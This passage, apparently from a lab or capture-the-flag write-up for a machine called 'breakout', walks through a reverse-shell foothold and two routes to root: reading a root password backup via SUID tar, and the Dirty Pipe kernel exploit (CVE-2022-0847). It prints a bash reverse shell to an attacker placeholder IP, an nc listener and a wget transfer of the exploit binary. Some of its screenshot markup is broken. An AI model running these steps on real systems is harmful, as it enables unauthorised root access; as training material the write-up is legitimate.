I was able to get root **two different ways** — I'll cover both: the intended path the machine author designed, and an alternative kernel exploit path.

## 5. Foothold — Reverse Shell via Usermin

From the Usermin Command Shell, craft a reverse netcat shell. You can generate one at [revshells.com](https://revshells.com) — set your Kali IP and a free port (I used 4444).

```bash
bash -c 'bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1'
```

Set up your listener first:

```bash
nc -lvnp 4444
```

`tar` has the SUID bit. Normally you can't directly get a shell from SUID tar, but you **can** use it to read files owned by root.

### Finding the Backup

<Screenshot
  src="/screenshots/breakout/found-backups-folder.png"
  alt="Discovered a backups directory containing .old_pass"
  caption="There's a .old_pass file inside the backups folder — unreadable as cyber"
/>

After navigating around the filesystem, there's a backup file called `.old_pass` that the `cyber` user can't read directly. But with SUID tar, we can compress it and read its contents:

<Screenshot
  src="/screenshots/breakout/tar-read-oldbak.png"
  alt="Using SUID tar to compress old_pass and read its contents"
  caption="tar -czf /tmp/bak.tar /path/to/.old_pass — then extract and read"

<Screenshot

  alt="Plaintext root password found inside .old_pass"
  caption="Plaintext root credentials inside the backup"

The backup contains the root password in plaintext. Running `su root` with that password gets us a root shell.

## 7. Privilege Escalation — Path 2: Dirty Pipe (CVE-2022-0847)

The kernel version running on this machine is vulnerable to the **Dirty Pipe** exploit. This is an alternative path to root without needing the backup file.

Using [AlexisAhmed's CVE-2022-0847 exploit](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits), cloned to our Kali machine and compiled with `-static`:

```bash
gcc -o dirtypipe exploit.c -static
```

<Note type="note">
  The `-static` flag bundles all library dependencies (like `libc`) directly into the binary. This is necessary because the `cyber` user doesn't have `gcc` on the target — we compile on our machine and transfer the pre-built binary. Static compilation removes the target's dependency on its own `/lib/x86_64-linux-gnu/libc.so.6`.
</Note>

<Screenshot
  src="/screenshots/breakout/wget-dirtypipe.png"
  alt="Transferring the compiled dirty pipe exploit to the target via wget"
  caption="wget http://KALI_IP:8000/dirtypipe — pulling the binary from our HTTP server"
/>

<Screenshot
  src="/screenshots/breakout/privesc-dirtypipe.png"
  alt="Running the dirty pipe exploit to escalate to root"
  caption="CVE-2022-0847 Dirty Pipe — overwrites a SUID binary to spawn a root shell"
/>

You can use any shell as the target — `/bin/bash` or `/bin/sh` will both work.

<Note type="warning">
  The Dirty Pipe path is noisier than Path 1 — it modifies a SUID binary on disk (temporarily). Path 1 via the backup password is cleaner and is the intended route the machine author designed.
</Note>
